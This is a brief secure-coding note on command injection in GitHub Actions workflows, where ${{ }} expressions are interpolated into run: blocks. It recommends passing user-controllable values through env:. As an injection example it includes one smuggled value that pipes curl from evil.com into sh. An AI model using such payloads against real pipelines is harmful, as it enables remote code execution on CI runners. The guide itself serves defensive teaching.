# GitHub Actions — Input Injection via ${{ }}

## The Problem

Using `${{ github.event.inputs.* }}` directly in `run:` blocks allows command injection. The expression is interpolated by GitHub before the shell sees it, so shell quoting doesn't help.

Example (vulnerable):
```yaml
- run: echo "${{ github.event.inputs.title }}"
```

If title contains `"; curl evil.com | sh; echo "`, it executes.

## The Fix

Always pass inputs through `env:` first:
```yaml
- env:
    TITLE: ${{ github.event.inputs.issue_title }}
  run: echo "$TITLE"
```

The env var is set by the runner, not interpolated into the script text. Shell quoting works normally.

## Scope

Applies to ALL `${{ }}` expressions in `run:` blocks, not just inputs — also `github.event.pull_request.title`, `github.event.comment.body`, etc. Any user-controllable value.

Safe contexts (no injection risk): `if:`, `with:`, `env:` value side.
